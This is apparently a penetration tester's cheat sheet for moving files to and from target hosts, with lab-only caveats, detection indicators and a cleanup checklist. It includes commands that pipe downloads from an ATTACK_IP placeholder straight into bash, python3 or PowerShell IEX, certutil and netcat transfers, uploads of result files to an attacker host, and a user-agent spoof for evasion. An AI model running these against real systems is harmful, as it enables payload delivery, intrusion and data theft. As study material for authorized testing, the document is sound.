# 📦 File Transfer Cheat Sheet

> Authorized labs and assessments only. Replace placeholders such as `ATTACK_IP`, `TARGET_IP`, paths, users, and passwords. Prefer authenticated, encrypted transports and verify SHA-256 after every transfer.

## Choose a method

| If available | Use |
|---|---|
| SSH | SCP or SFTP |
| HTTPS | curl, wget, PowerShell, or BITS |
| Windows SMB | Authenticated SMB2/3 share |
| WinRM | `Copy-Item -ToSession/-FromSession` |
| RDP | Mapped drive |
| Only an interpreter | Python, PHP, Ruby, or Perl one-liner |
| Text-only channel | Base64 for small files |
| Last-resort lab stream | Ncat/Netcat plus hash verification |

---

## Temporary HTTP servers

```bash
# Python 3
python3 -m http.server 8000 --directory /srv/share

# Python 2
cd /srv/share && python2.7 -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000 -t /srv/share

# Ruby
cd /srv/share && ruby -run -ehttpd . -p8000
```

Check the listener:

```bash
ss -lntp | grep ':8000'
```

## Linux HTTP downloads

```bash
wget http://ATTACK_IP:8000/file.bin -O /tmp/file.bin
curl -fL http://ATTACK_IP:8000/file.bin -o /tmp/file.bin
```

In-memory execution of reviewed content only:

```bash
curl -fsSL http://ATTACK_IP:8000/script.sh | bash
wget -qO- http://ATTACK_IP:8000/script.py | python3
```

## Windows HTTP downloads

```powershell
(New-Object Net.WebClient).DownloadFile('http://ATTACK_IP:8000/file.bin','C:\\Temp\\file.bin')
(New-Object Net.WebClient).DownloadFileAsync('http://ATTACK_IP:8000/file.bin','C:\\Temp\\file.bin')
Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -OutFile 'C:\\Temp\\file.bin'
Invoke-RestMethod 'http://ATTACK_IP:8000/file.bin' -OutFile 'C:\\Temp\\file.bin'
```

Download reviewed PowerShell text into memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACK_IP:8000/script.ps1')
```

Older PowerShell:

```powershell
Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -UseBasicParsing -OutFile 'C:\\Temp\\file.bin'
```

BITS:

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source 'http://ATTACK_IP:8000/file.bin' -Destination 'C:\\Temp\\file.bin'
```

---

## Python uploadserver

HTTP receiver:

```bash
python3 -m pip install uploadserver
mkdir -p /srv/uploads && cd /srv/uploads
python3 -m uploadserver 8000
```

HTTPS receiver with a short-lived lab certificate:

```bash
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout server.pem -out server.pem -days 1
python3 -m uploadserver 443 --server-certificate server.pem
```

Python upload:

```bash
python3 -c 'import requests; requests.post("http://ATTACK_IP:8000/upload", files={"files":open("/tmp/result.txt","rb")})'
```

PowerShell upload when the appropriate helper/function is loaded:

```powershell
Invoke-FileUpload -Uri 'http://ATTACK_IP:8000/upload' -File 'C:\\Temp\\result.txt'
```

---

## SCP and SFTP

```bash
# local to remote
scp ./tool.sh user@TARGET_IP:/tmp/tool.sh

# remote to local
scp user@TARGET_IP:/tmp/result.txt ./result.txt

# recursive directory
scp -r ./directory user@TARGET_IP:/tmp/

# interactive SFTP
sftp user@TARGET_IP
```

---

## Base64

Base64 is encoding, not encryption. Use only for small files.

Linux encode/decode:

```bash
base64 -w 0 file.bin > file.b64
echo '<BASE64>' | base64 -d > file.bin
```

PowerShell encode/decode:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\file.bin'))
[IO.File]::WriteAllBytes('C:\\Temp\\file.bin',[Convert]::FromBase64String('<BASE64>'))
```

Avoid long Base64 strings in `cmd.exe`; its command line is limited to roughly 8,191 characters.

---

## Authenticated SMB share

Attack host:

```bash
sudo mkdir -p /srv/share
sudo impacket-smbserver share /srv/share \
  -smb2support -username labuser -password '<STRONG_PASSWORD>'
```

Windows:

```cmd
net use \\ATTACK_IP\share /user:labuser <STRONG_PASSWORD>
copy \\ATTACK_IP\share\tool.exe C:\Temp\tool.exe
copy C:\Temp\result.txt \\ATTACK_IP\share\result.txt
net use \\ATTACK_IP\share /delete
```

---

## WebDAV

Attack host:

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/srv/share --auth=anonymous
```

Windows:

```cmd
dir \\ATTACK_IP\DavWWWRoot
copy \\ATTACK_IP\DavWWWRoot\tool.exe C:\Temp\tool.exe
copy C:\Temp\result.txt \\ATTACK_IP\DavWWWRoot\result.txt
```

Anonymous HTTP WebDAV is lab-only. Use HTTPS and authentication for real assessment data.

---

## FTP

Temporary lab server:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

PowerShell:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://ATTACK_IP/file.bin','C:\\Temp\\file.bin')
(New-Object Net.WebClient).UploadFile('ftp://ATTACK_IP/result.txt','C:\\Temp\\result.txt')
```

Legacy Windows client command file:

```text
open ATTACK_IP
USER
PASSWORD
binary
get file.bin C:\Temp\file.bin
put C:\Temp\result.txt result.txt
bye
```

```cmd
ftp -s:ftp-commands.txt
```

FTP is plaintext; prefer SFTP or HTTPS.

---

## Netcat and Ncat

Receiver listens, sender connects:

```bash
# receiver
nc -lvnp 9001 > received.bin

# sender
nc RECEIVER_IP 9001 < file.bin
```

Ncat with explicit modes:

```bash
ncat -l 9001 --recv-only > received.bin
ncat RECEIVER_IP 9001 --send-only < file.bin
```

Bash fallback:

```bash
cat file.bin > /dev/tcp/RECEIVER_IP/9001
```

No encryption/authentication/integrity: use only on an isolated authorized network and compare hashes.

---

## Bash `/dev/tcp` HTTP fallback

```bash
exec 3<>/dev/tcp/ATTACK_IP/8000
printf 'GET /file.bin HTTP/1.0\r\nHost: ATTACK_IP\r\n\r\n' >&3
cat <&3 > response.bin
```

Remove HTTP headers before treating `response.bin` as the downloaded file.

---

## Language one-liners

Python:

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("http://ATTACK_IP:8000/file", "file")'
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://ATTACK_IP:8000/file", "file")'
```

PHP:

```bash
php -r '$d=file_get_contents("http://ATTACK_IP:8000/file"); file_put_contents("file",$d);'
```

Ruby:

```bash
ruby -e 'require "net/http"; File.write("file",Net::HTTP.get(URI("http://ATTACK_IP:8000/file")))'
```

Perl:

```bash
perl -e 'use LWP::Simple; getstore("http://ATTACK_IP:8000/file","file");'
```

Windows Script Host:

```cmd
cscript.exe /nologo wget.js http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
cscript.exe /nologo wget.vbs http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
```

JavaScript/VBScript downloaders commonly use WinHTTP/XMLHTTP plus `ADODB.Stream`.

---

## PowerShell Remoting

```powershell
$s = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
Copy-Item .\\tool.ps1 -Destination 'C:\\Temp\\tool.ps1' -ToSession $s
Copy-Item 'C:\\Temp\\result.txt' -Destination .\\result.txt -FromSession $s
Remove-PSSession $s
```

WinRM defaults: TCP 5985 (HTTP) and 5986 (HTTPS).

---

## RDP drive mapping

```bash
xfreerdp /v:TARGET_IP /u:USER /p:'PASSWORD' /drive:share,/srv/share
rdesktop TARGET_IP -r disk:share=/srv/share
```

Windows path:

```text
\\tsclient\share
```

---

## Encrypt files before transfer

OpenSSL encrypt/decrypt:

```bash
openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
  -in results.txt -out results.enc

openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 \
  -in results.enc -out results.txt
```

PowerShell helper after reviewing and importing it:

```powershell
Import-Module .\\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key '<UNIQUE_STRONG_SECRET>' -Path .\\results.txt
Invoke-AESEncryption -Mode Decrypt -Key '<UNIQUE_STRONG_SECRET>' -Path .\\results.txt.aes
```

Use a unique secret per engagement and send it through a separate approved channel.

---

## Nginx HTTP PUT receiver

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

`/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/upload.conf
sudo nginx -t
sudo systemctl restart nginx
curl -T ./result.txt http://SERVER_IP:9001/SecretUploadDirectory/result.txt
```

Troubleshoot:

```bash
tail -f /var/log/nginx/error.log
ss -lntp
```

Use authentication, TLS, source restrictions, a non-executable directory, file-size limits, and no directory listing.

---

## Living-off-the-land examples

BITS:

```powershell
Start-BitsTransfer -Source 'http://ATTACK_IP:8000/file.bin' -Destination 'C:\\Temp\\file.bin'
```

Certutil:

```cmd
certutil.exe -verifyctl -split -f http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
```

OpenSSL stream:

```bash
# sender
openssl s_server -quiet -accept 9001 -cert certificate.pem -key key.pem < file.bin

# receiver
openssl s_client -connect SENDER_IP:9001 -quiet > file.bin
```

Look up approved techniques by function in LOLBAS (Windows) and GTFOBins (Linux). Expect endpoint and network telemetry.

---

## Detection reference

| Method | Common HTTP indicator |
|---|---|
| PowerShell | `WindowsPowerShell/<version>` |
| WinHTTP COM | `WinHttp.WinHttpRequest` |
| MSXML COM | Legacy IE/Trident-like user agent |
| Certutil | `Microsoft-CryptoAPI/<version>` |
| BITS | `Microsoft BITS/<version>` and often `HEAD` before `GET` |

User-agent strings are client-controlled. Correlate with process creation, PowerShell/AMSI logs, DNS/proxy/firewall data, destination rarity, file writes, and execution.

Authorized user-agent test:

```powershell
$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -UserAgent $ua -OutFile 'C:\\Temp\\file.bin'
```

Changing the header does not remove other telemetry. Use only when evasive testing is explicitly in scope.

---

## Validate integrity

Linux:

```bash
sha256sum file.bin
```

Windows:

```powershell
Get-FileHash .\\file.bin -Algorithm SHA256
```

The source and destination hashes must match.

## Cleanup checklist

- Stop HTTP/S, FTP, SMB, WebDAV, Netcat, OpenSSL, and Nginx listeners
- Remove temporary shares, mapped drives, WinRM sessions, accounts, and certificates
- Remove temporary firewall rules and relaxed validation settings
- Delete transferred test files according to the engagement plan
- Preserve required evidence, hashes, and operator notes in the approved location

## Related notes

- [HTB Academy module notes](../platforms/hack-the-box/penetration-tester-path/getting-started-file-transfers.md)
- [Unified file-transfer knowledge](../knowledge-base/exploitation/file-transfer.md)

